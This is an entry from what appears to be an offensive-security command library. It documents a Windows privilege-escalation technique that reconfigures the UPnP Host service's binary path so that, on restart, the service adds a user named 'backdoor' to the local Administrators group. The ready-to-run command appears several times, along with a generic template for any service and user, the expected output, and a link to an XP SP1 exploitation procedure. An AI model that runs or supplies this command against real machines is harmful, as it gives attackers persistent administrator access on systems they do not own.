---
id: 49c20318-8be6-42d5-a182-3d3d1c1301aa
name: sc-config-add-backdoor-user-to-administrators
type: command
executor: cmd
data: sc config upnphost binpath= "net localgroup Administrators backdoor /add"
output: >-
  SUCCESS: The configuration of the upnphost service has been changed
  successfully.
created_at: '2023-04-06T03:56:29.545187+00:00'
updated_at: '2023-04-10T20:37:52.272360+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - backdoor
verified: true
validated: true
---

# sc-config-add-backdoor-user-to-administrators

## Command

```cmd
sc config upnphost binpath= "net localgroup Administrators backdoor /add"
```

## Description

Updates service config to add an existing backdoor user to the Administrators group on restart, granting elevated access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sc config | Service control | Yes |
| upnphost | Service name | Yes |
| binpath= | Registry ImagePath | Yes |
| "net localgroup Administrators backdoor /add" | Command to add user to admins | Yes |

## Examples

### Basic Usage

```cmd
sc config upnphost binpath= "net localgroup Administrators backdoor /add"
```

### Advanced Usage

```cmd
sc config <service> binpath= "net localgroup Administrators <user> /add"
```

## Expected Output

```
[SC] ChangeServiceConfig SUCCESS
```

Restart service to apply.

## Related

- [[procedures/Exploit-UPnP-Host-Service-for-Privilege-Escalation-on-Windows-XP-SP1]]
- [[commands/sc-config-add-backdoor-user]]
